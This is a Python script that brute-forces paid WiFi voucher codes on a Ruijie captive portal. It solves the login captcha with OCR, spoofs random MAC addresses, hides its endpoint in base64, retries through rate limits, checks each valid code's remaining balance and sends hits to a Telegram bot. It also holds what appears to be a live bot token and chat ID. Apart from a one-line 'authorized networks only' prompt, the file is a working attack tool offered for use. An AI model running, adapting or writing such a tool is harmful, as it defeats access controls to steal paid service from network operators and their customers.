#!/usr/bin/env python3
# ==============================================
#  Ruijie Voucher Scanner  —  v7.0
#  - Same UI style as original (don't change look)
#  - H4CK3R async scan engine inside (captcha, session, balance)
#  - Telegram notifications
#  - Real-time stats (Speed, Tried, Hits)
#  - URL first → ask number range → scan
# ==============================================

import requests
import threading
import time
import sys
import os
import asyncio
import aiohttp
import base64
import random
import re
import string
import json
from datetime import datetime

try:
    import cv2
    import ddddocr
    import numpy as np
    _HAS_OCR = True
except ImportError:
    _HAS_OCR = False

# ========== CONFIGURATION ==========
TARGET_URL = "https://portal-as.ruijienetworks.com/api/auth/wifidog?stage=portal&gw_id=9cce887e2b7e&gw_sn=H1U72QB006007&gw_address=192.168.110.1&gw_port=2060&ip=192.168.110.46&mac=30:f2:3c:ef:bf:37&slot_num=8&nasip=192.168.1.38&ssid=VLAN233&ustate=0&mac_req=1&url=http%3A%2F%2F192.168.0.1%2F&chap_id=%5C140&chap_challenge=%5C037%5C061%5C072%5C122%5C040%5C141%5C252%5C331%5C122%5C375%5C042%5C015%5C130%5C263%5C365%5C222%5C"
VOUCHER_PARAM     = "voucher"
SUCCESS_KEYWORD   = "success"
THREADS           = 50
START_CODE        = 0
END_CODE          = 999999
TELEGRAM_BOT_TOKEN = "8638714257:AAE40FVmDlXEn8qH1rhIECMXUmIEJaQNQIQ"
TELEGRAM_CHAT_ID   = "7289768738"
FOUND_FILE         = "found_voucher.txt"
RESULT_FILE        = os.path.expanduser("~/scan_results.txt")
RESUME_FILE        = "voucher_resume.json"
# ===================================

# H4CK3R engine globals
_connector   = None
_voucher_sem = None
_ocr         = None
stop_flag    = False
found_codes  = []
limited_codes = []
retry_total  = 0

# Original globals (keep for stats display)
tried     = 0
hits      = []
lock      = threading.Lock()
start_time = None


# =============================================
#  TELEGRAM
# =============================================
def send_telegram(message):
    """Send message to Telegram"""
    if TELEGRAM_BOT_TOKEN == "8638714257:AAE40FVmDlXEn8qH1rhIECMXUmIEJaQNQIQ":
        return
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    try:
        requests.post(url, json={"chat_id": TELEGRAM_CHAT_ID, "text": message}, timeout=3)
    except:
        pass


# =============================================
#  H4CK3R ENGINE — Network helpers
# =============================================
def get_mac():
    """Generate a random MAC address."""
    b = random.choice([0x02, 0x06, 0x0A, 0x0E])
    return ":".join(f"{x:02x}" for x in ([b] + [random.randint(0, 255) for _ in range(5)]))

def replace_mac(url, new_mac):
    """Replace the mac= parameter in a URL."""
    return re.sub(r'(?<=mac=)[^&]+', new_mac, url)

async def get_session_id(sess, session_url, previous=None):
    """Get session ID by visiting portal URL (mac is randomized)."""
    url = replace_mac(session_url, get_mac())
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'user-agent': 'Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 '
                      '(KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
        'upgrade-insecure-requests': '1',
    }
    try:
        async with sess.get(url, headers=headers, allow_redirects=True, ssl=False) as r:
            sid = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", str(r.url))
            return sid.group(1) if sid else previous
    except:
        return previous


# =============================================
#  H4CK3R ENGINE — Captcha (ddddocr + OpenCV)
# =============================================
def _init_ocr():
    global _ocr
    if _ocr is None and _HAS_OCR:
        try:
            _ocr = ddddocr.DdddOcr(show_ad=False)
        except:
            _ocr = None
    return _ocr

def _ocr_sync(image_bytes):
    ocr = _init_ocr()
    if ocr is None:
        return None
    nparr = np.frombuffer(image_bytes, np.uint8)
    img   = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
    if img is None:
        return None
    gray  = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
    blur  = cv2.GaussianBlur(gray, (3, 3), 0)
    _, th = cv2.threshold(blur, 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU)
    _, buf = cv2.imencode('.png', th)
    return ocr.classification(buf.tobytes()).upper()

async def Captcha_Text(img_bytes):
    return await asyncio.to_thread(_ocr_sync, img_bytes)

async def Captcha_Image(sess, session_id):
    h = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': 'image/*,*/*;q=0.8',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 '
                      '(KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
    }
    async with sess.get(
        'https://portal-as.ruijienetworks.com/api/auth/captcha/image',
        params={'sessionId': session_id, '_t': str(time.time())},
        headers=h, ssl=False
    ) as r:
        return await r.read()

async def Varify_Captcha(sess, session_id, text):
    h = {
        'authority': 'portal-as.ruijienetworks.com',
        'content-type': 'application/json',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 '
                      '(KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
    }
    async with sess.post(
        'https://portal-as.ruijienetworks.com/api/auth/captcha/verify',
        headers=h, json={'sessionId': session_id, 'authCode': text}, ssl=False
    ) as r:
        d = await r.json()
        return session_id if d.get("success") is True else None


# =============================================
#  H4CK3R ENGINE — Balance / time check
# =============================================
async def Code_Expires_Date(session_id):
    h_macc2 = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': 'application/json, */*; q=0.01',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 '
                      '(KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
    }
    h_auth = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/json;',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 '
                      '(KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0',
        'x-requested-with': 'XMLHttpRequest',
    }
    endpoints = [
        (f'https://portal-as.ruijienetworks.com/api/auth/balance/getBalance/{session_id}', h_auth),
        (f'https://portal-as.ruijienetworks.com/api/macc2/balance/getBalance/{session_id}', h_macc2),
    ]
    for url, headers in endpoints:
        try:
            async with aiohttp.ClientSession(
                connector=_connector, connector_owner=False,
                cookie_jar=aiohttp.CookieJar(),
                timeout=aiohttp.ClientTimeout(total=15)
            ) as s:
                async with s.get(url, headers=headers, ssl=False) as r:
                    data = await r.json()
                    res  = data.get('result', {})
                    plan = res.get('profileName', 'Unknown')
                    remaining = res.get('remainingMinutes')
                    if remaining is not None:
                        remaining = int(remaining)
                        if remaining >= 0:
                            hh, mm = divmod(remaining, 60)
                            time_str = f"{hh}h {mm}m" if hh else f"{mm}m"
                        else:
                            time_str = f"Expired ({remaining} mins)"
                        return f"Plan: {plan} | Time: {time_str}"
                    total = res.get('totalMinutes')
                    if total is not None:
                        hh, mm = divmod(int(total), 60)
                        time_str = f"{hh}h {mm}m" if hh else f"{mm}m"
                        return f"Plan: {plan} | Time: {time_str}"
        except:
            continue
    return "Plan:Unknown | Time:Unknown"


# =============================================
#  H4CK3R ENGINE — Voucher POST endpoint
# =============================================
_post_url = base64.b64decode(
    b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM='
).decode()


# =============================================
#  H4CK3R ENGINE — Core voucher check
# =============================================
async def perform_check(session_url, code):
    """Real voucher check: session → captcha → verify → POST → detect result."""
    global retry_total, tried, hits

    for attempt in range(3):
        async with aiohttp.ClientSession(
            connector=_connector, connector_owner=False,
            cookie_jar=aiohttp.CookieJar(),
            timeout=aiohttp.ClientTimeout(total=30)
        ) as sess:
            session_id = await get_session_id(sess, session_url)
            if not session_id:
                return

            # Solve captcha
            auth_code = None
            if _HAS_OCR:
                for _ in range(8):
                    try:
                        img      = await Captcha_Image(sess, session_id)
                        text     = await Captcha_Text(img)
                        if not text:
                            continue
                        verified = await Varify_Captcha(sess, session_id, text)
                        if verified:
                            auth_code = text
                            break
                    except:
                        pass

            if not auth_code:
                if not _HAS_OCR:
                    auth_code = ""
                else:
                    return

            if stop_flag:
                return

            payload = {
                "accessCode": code,
                "sessionId":  session_id,
                "apiVersion": 1,
                "authCode":   auth_code,
            }
            headers = {
                "authority":       "portal-as.ruijienetworks.com",
                "accept":          "*/*",
                "content-type":    "application/json",
                "origin":          "https://portal-as.ruijienetworks.com",
                "user-agent":      "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 "
                                   "(KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
            }
            try:
                async with sess.post(_post_url, json=payload, headers=headers, ssl=False) as r:
                    response = await r.text()
            except:
                return

        if 'request limited' in response:
            retry_total += 1
            await asyncio.sleep(0.5)
            continue
        break
    else:
        return

    # Count as tried
    with lock:
        tried += 1

    # Detect result
    if 'logonUrl' in response:
        info = await Code_Expires_Date(session_id)
        found_codes.append(f"{code} | {info}")
        with lock:
            hits.append(code)
        try:
            with open(RESULT_FILE, "a", encoding="utf-8") as f:
                f.write(f"[SUCCESS] {code}  |  {info}\n")
        except:
            pass
        send_telegram(f"✅ Voucher found: {code}\n{info}\nURL: {session_url}")
        print(f"\n[+] SUCCESS CODE: {code} | {info}")

    elif 'STA' in response:
        info = await Code_Expires_Date(session_id)
        limited_codes.append(f"{code} | {info}")
        try:
            with open(RESULT_FILE, "a", encoding="utf-8") as f:
                f.write(f"[LIMITED] {code}  |  {info}\n")
        except:
            pass
        send_telegram(f"⚠️ LIMITED CODE: {code}\n{info}")
        print(f"\n[-] LIMITED CODE: {code} | {info}")


# =============================================
#  CODE ITERATOR — number range
# =============================================
def iter_range_codes(start, end):
    """Yield codes from start to end (zero-padded to max digit length)."""
    digits = max(len(str(start)), len(str(end)))
    codes = [str(i).zfill(digits) for i in range(start, end + 1)]
    random.shuffle(codes)
    for c in codes:
        yield c

def iter_random_codes(length, count=None):
    """Yield random digit codes of given length."""
    i = 0
    while count is None or i < count:
        yield "".join(random.choice(string.digits) for _ in range(length))
        i += 1


# =============================================
#  STATS PRINTER (original style — don't change)
# =============================================
def stats_printer():
    """Print real-time stats"""
    global start_time
    start_time = time.time()
    while not stop_flag:
        time.sleep(1)
        elapsed = time.time() - start_time
        speed = tried / elapsed if elapsed > 0 else 0
        sys.stdout.write(f"\rSPEED: {speed:.1f} c/s | TRIED: {tried} | HITS: {len(hits)} | CURRENT: {tried:06d}")
        sys.stdout.flush()
    print()  # newline


# =============================================
#  ASYNC SCAN RUNNER
# =============================================
async def run_scan(session_url, start_code, end_code, workers, code_list=None):
    """Run the async scan — H4CK3R engine inside."""
    global _voucher_sem, stop_flag, _connector, tried, hits
    global found_codes, limited_codes, retry_total

    _init_ocr()

    tried          = 0
    hits           = []
    found_codes    = []
    limited_codes  = []
    retry_total    = 0
    stop_flag      = False

    _connector   = aiohttp.TCPConnector(limit=workers + 100, ssl=False)
    _voucher_sem = asyncio.Semaphore(workers)

    # Build code source
    if code_list:
        all_codes = code_list
        total = len(all_codes)
        code_iter = iter(all_codes)
    else:
        digits = max(len(str(start_code)), len(str(end_code)))
        total = end_code - start_code + 1
        code_iter = iter_range_codes(start_code, end_code)

    # Start stats printer thread (original style)
    stats_thread = threading.Thread(target=stats_printer, daemon=True)
    stats_thread.start()

    checked = 0
    try:
        while not stop_flag:
            batch = []
            for _ in range(500):
                try:
                    batch.append(next(code_iter))
                except StopIteration:
                    break
            if not batch:
                break

            async def _check(c):
                async with _voucher_sem:
                    await perform_check(session_url, c)

            await asyncio.gather(*[_check(c) for c in batch], return_exceptions=True)
            checked += len(batch)

    except (asyncio.CancelledError, KeyboardInterrupt):
        stop_flag = True
    finally:
        try:
            await _connector.close()
        except:
            pass

    # Final report (original style)
    elapsed = time.time() - start_time
    print(f"\n[+] Completed in {elapsed:.2f} seconds")
    print(f"    Checked: {checked} | Found: {len(found_codes)} | Limited: {len(limited_codes)} | Retries: {retry_total}")
    if hits:
        print(f"[+] Voucher found: {hits[0]}")
        with open(FOUND_FILE, "w") as f:
            f.write(f"{hits[0]}\n")
        if found_codes:
            print(f"[+] All success codes:")
            for c in found_codes:
                print(f"    {c}")
    else:
        print("[-] No valid voucher found in range.")
        send_telegram(f"❌ Brute-force finished on {session_url}\nTried {tried} codes, no hits.")


# =============================================
#  MAIN — URL first → ask range → scan
# =============================================
def main():
    global stop_flag

    print("[*] Ruijie Voucher Scanner Started")

    # ── Step 1: Ask for URL ──
    print(f"[*] Default Target: {TARGET_URL[:70]}...")
    use_default = input("[?] Use default URL? (y/n): ").strip().lower()
    if use_default == "y" or use_default == "":
        session_url = TARGET_URL
    else:
        session_url = input("[?] Enter Session URL: ").strip()
        if not session_url:
            print("[-] No URL provided. Using default.")
            session_url = TARGET_URL
    print(f"[*] Target: {session_url[:70]}...")

    # ── Step 2: Ask what number range to search ──
    print("\n[*] Code range options:")
    print("    1. 6-digit  (000000 - 999999)")
    print("    2. 7-digit  (0000000 - 9999999)")
    print("    3. Custom range")
    print("    4. Random 8-digit (infinite)")
    range_choice = input("[?] Select option (1-4): ").strip()

    if range_choice == "2":
        start_code = 0
        end_code   = 9999999
        code_list  = None
    elif range_choice == "3":
        try:
            start_code = int(input("[?] Start code (e.g. 0): ").strip())
            end_code   = int(input("[?] End code   (e.g. 999999): ").strip())
        except ValueError:
            print("[-] Invalid number. Using 6-digit default.")
            start_code, end_code = START_CODE, END_CODE
        code_list = None
    elif range_choice == "4":
        start_code = 0
        end_code   = 0
        code_list  = None  # will use random mode in run
    else:
        start_code = START_CODE
        end_code   = END_CODE
        code_list  = None

    # ── Step 3: Ask for workers ──
    workers_inp = input(f"[?] Number of workers (default {THREADS}): ").strip()
    try:
        workers = int(workers_inp) if workers_inp else THREADS
    except ValueError:
        workers = THREADS

    print(f"[*] Workers: {workers}")
    if range_choice == "4":
        print(f"[*] Mode: Random 8-digit (infinite)")
    else:
        digits = max(len(str(start_code)), len(str(end_code)))
        print(f"[*] Code range: {str(start_code).zfill(digits)} - {str(end_code).zfill(digits)}")

    if _HAS_OCR:
        print("[*] Captcha solver: ddddocr ✓")
    else:
        print("[!] Captcha solver not installed (pip install ddddocr opencv-python numpy)")

    # ── Confirm ──
    print("[!] Use only on authorized networks!")
    confirm = input("[?] Type 'yes' to start scanning: ").strip().lower()
    if confirm != "yes":
        print("[-] Aborted.")
        sys.exit(0)

    # ── Run scan ──
    if range_choice == "4":
        # Random 8-digit infinite mode
        asyncio.run(_run_random_scan(session_url, 8, workers))
    else:
        asyncio.run(run_scan(session_url, start_code, end_code, workers))


async def _run_random_scan(session_url, length, workers):
    """Random infinite scan mode."""
    global _voucher_sem, stop_flag, _connector, tried, hits
    global found_codes, limited_codes, retry_total

    _init_ocr()

    tried          = 0
    hits           = []
    found_codes    = []
    limited_codes  = []
    retry_total    = 0
    stop_flag      = False

    _connector   = aiohttp.TCPConnector(limit=workers + 100, ssl=False)
    _voucher_sem = asyncio.Semaphore(workers)

    code_iter = iter_random_codes(length)

    stats_thread = threading.Thread(target=stats_printer, daemon=True)
    stats_thread.start()

    checked = 0
    try:
        while not stop_flag:
            batch = []
            for _ in range(500):
                try:
                    batch.append(next(code_iter))
                except StopIteration:
                    break
            if not batch:
                break

            async def _check(c):
                async with _voucher_sem:
                    await perform_check(session_url, c)

            await asyncio.gather(*[_check(c) for c in batch], return_exceptions=True)
            checked += len(batch)

    except (asyncio.CancelledError, KeyboardInterrupt):
        stop_flag = True
    finally:
        try:
            await _connector.close()
        except:
            pass

    elapsed = time.time() - start_time
    print(f"\n[+] Completed in {elapsed:.2f} seconds")
    print(f"    Checked: {checked} | Found: {len(found_codes)} | Limited: {len(limited_codes)} | Retries: {retry_total}")
    if hits:
        print(f"[+] Voucher found: {hits[0]}")
        with open(FOUND_FILE, "w") as f:
            f.write(f"{hits[0]}\n")
    else:
        print("[-] No valid voucher found.")
        send_telegram(f"❌ Scan finished\nTried {tried} codes, no hits.")


if __name__ == "__main__":
    # Quick check
    if TELEGRAM_BOT_TOKEN == "8638714257:AAE40FVmDlXEn8qH1rhIECMXUmIEJaQNQIQ":
        print("[!] Telegram not configured. Set TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID")
    main()
